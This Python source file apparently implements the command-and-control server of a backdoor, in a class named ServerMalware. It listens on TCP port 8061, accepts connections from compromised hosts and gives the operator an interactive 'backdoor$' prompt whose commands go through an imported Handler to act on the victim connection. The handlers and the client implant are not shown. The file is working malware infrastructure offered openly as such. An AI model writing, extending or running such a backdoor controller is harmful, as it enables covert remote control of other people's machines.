import socket
from main import colors
from time import sleep
from main.Handler import Handler
Colors = colors.Colors()

print = Colors.print

class ServerMalware:
    def __init__(self, addr):
        address, port = addr
        self.port = port
        self.handler = Handler().main
        self.run(addr)
    

    def create_socket(self, addr, listen_number=1):
        '''
        Create, bind and define the max number of simultaneous
        connections.
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(addr)
        s.listen(listen_number)
        return s
    
    def handle(self, conn, command_name):
        chosen = self.handler(command_name)
        return chosen(conn)

    
    
    def run(self, addr):
        try:
            s = self.create_socket(addr)
            while True:
                print(f'[+]Listening on port {self.port}','green')
                c, e = s.accept()
                print(f'[+]Connection received from {e}', 'green')

                while True:
                    try:
                        command = input(f'{Colors.colors["blue"]}backdoor{Colors.colors["red"]}$ {Colors.colors["default"]}').strip()
                        self.handle(c, command)
                    except Exception as E:
                        if E != KeyboardInterrupt:
                            print('[-] Something went wrong', 'red')
                            c.close()
                            break
        except KeyboardInterrupt:
            s.close()
            print('Closed')



        
    
def main():
    ServerMalware(('',8061))

if __name__ == '__main__':
    main()

